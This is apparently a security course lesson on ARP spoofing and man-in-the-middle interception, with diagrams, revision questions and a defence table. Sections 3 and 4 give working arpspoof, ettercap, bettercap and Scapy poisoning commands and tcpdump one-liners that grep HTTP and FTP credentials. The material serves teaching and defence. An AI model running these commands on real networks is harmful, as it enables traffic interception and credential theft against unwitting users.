# ARP Spoofing and Poisoning

## Unit 5 - Topic 1 | Man-in-the-Middle Attacks

---

## Overview

**ARP spoofing** (also called ARP poisoning) manipulates the Address Resolution Protocol to associate the attacker's MAC address with a victim's IP address. This redirects network traffic through the attacker's machine, enabling man-in-the-middle (MitM) interception.

---

## 1. How ARP Works (Normal)

```
NORMAL ARP RESOLUTION:

Victim (192.168.1.10) wants to reach Gateway (192.168.1.1)

Step 1: ARP Request (Broadcast)
┌─────────────┐                              ┌─────────────┐
│   Victim     │ ──── "Who has 192.168.1.1?" ──→│  All Hosts  │
│ 192.168.1.10 │        (Broadcast)            │  on LAN     │
│ AA:AA:AA:AA  │                               │             │
└─────────────┘                              └─────────────┘

Step 2: ARP Reply (Unicast)
┌─────────────┐                              ┌─────────────┐
│   Gateway    │ ──── "I am 192.168.1.1,     ──→│   Victim    │
│ 192.168.1.1  │      MAC: BB:BB:BB:BB"       │ 192.168.1.10│
│ BB:BB:BB:BB  │        (Unicast)              │             │
└─────────────┘                              └─────────────┘

Step 3: Victim ARP Cache Updated:
192.168.1.1  →  BB:BB:BB:BB (Gateway MAC) ✅
```

---

## 2. ARP Spoofing Attack

```
ARP POISONING ATTACK:

Attacker sends FAKE ARP replies (no request needed!):

TO VICTIM:  "192.168.1.1 is at CC:CC:CC:CC" (Attacker's MAC)
TO GATEWAY: "192.168.1.10 is at CC:CC:CC:CC" (Attacker's MAC)

RESULT — Traffic redirected through attacker:

┌──────────┐         ┌──────────┐         ┌──────────┐
│  Victim  │ ──1──→  │ ATTACKER │ ──2──→  │ Gateway  │
│ .1.10    │         │ .1.50    │         │ .1.1     │
│          │ ←─4──  │ (MitM)   │ ←─3──  │          │
└──────────┘         └──────────┘         └──────────┘

1. Victim sends traffic to Attacker (thinks it's Gateway)
2. Attacker forwards to real Gateway
3. Gateway replies to Attacker (thinks it's Victim)
4. Attacker forwards reply to Victim

Both sides unaware! Attacker sees ALL traffic.
```

---

## 3. ARP Spoofing Tools

```bash
# === ARPSPOOF (dsniff package) ===
# Enable IP forwarding first!
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison victim's ARP cache:
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
# Tells victim: "I am the gateway"

# Poison gateway's ARP cache (run in separate terminal):
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
# Tells gateway: "I am the victim"

# === ETTERCAP ===
ettercap -T -q -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1//
# -T: text mode
# -M arp:remote: ARP MitM attack
# Automatically poisons both directions

# === BETTERCAP ===
sudo bettercap -iface eth0
# In bettercap console:
set arp.spoof.targets 192.168.1.10
arp.spoof on
net.sniff on

# === SCAPY (Python) ===
from scapy.all import *

def poison(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip,
                 hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
```

---

## 4. Intercepting Traffic After ARP Spoof

```bash
# === CAPTURE ALL TRAFFIC ===
tcpdump -i eth0 -w captured.pcap

# === CAPTURE CREDENTIALS ===
# Unencrypted protocols:
# HTTP, FTP, Telnet, POP3, IMAP, SMTP

# Capture HTTP credentials:
tcpdump -i eth0 -A port 80 | grep -i "user\|pass"

# Capture FTP credentials:
tcpdump -i eth0 -A port 21 | grep -i "USER\|PASS"

# === WIRESHARK ANALYSIS ===
wireshark captured.pcap
# Filter: http.authbasic (HTTP Basic Auth)
# Filter: ftp.request.command == "PASS"

# === NETWORK SNIFFING WITH BETTERCAP ===
# Already running after arp.spoof:
set net.sniff.verbose true
net.sniff on
# Shows captured credentials in real-time
```

---

## 5. Detection and Prevention

| Defense | How It Works |
|---------|-------------|
| **Static ARP entries** | Manually map IP→MAC (not scalable) |
| **Dynamic ARP Inspection** | Switch validates ARP packets |
| **802.1X (NAC)** | Port-based access control |
| **ARP watch** | Monitor ARP table changes |
| **Encrypted protocols** | HTTPS, SSH — data encrypted even if captured |
| **VPN** | Encrypts all traffic |
| **VLAN segmentation** | Limits attack scope |

```bash
# === DETECT ARP SPOOFING ===
# Check ARP table for duplicates:
arp -a | sort
# Two IPs with same MAC = ARP spoof!

# arpwatch daemon:
arpwatch -i eth0
# Alerts on ARP table changes
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **ARP spoofing** | Associate attacker's MAC with victim's IP |
| **Gratuitous ARP** | Unsolicited replies poison ARP cache |
| **IP forwarding** | Must enable to forward intercepted traffic |
| **arpspoof** | Classic tool from dsniff package |
| **Bettercap** | Modern framework with ARP + sniffing |
| **Defense** | DAI on switches, encrypted protocols |

---

## Quick Revision Questions

1. **Why is ARP vulnerable to spoofing attacks?**
2. **Why must IP forwarding be enabled during ARP spoofing?**
3. **What is the difference between ARP spoofing and ARP poisoning?**
4. **How can Dynamic ARP Inspection prevent this attack?**
5. **What traffic can be intercepted via ARP spoofing?**

---

[Next: DNS Spoofing →](02-dns-spoofing.md)

---

*Unit 5 - Topic 1 of 6 | [Back to README](../README.md)*
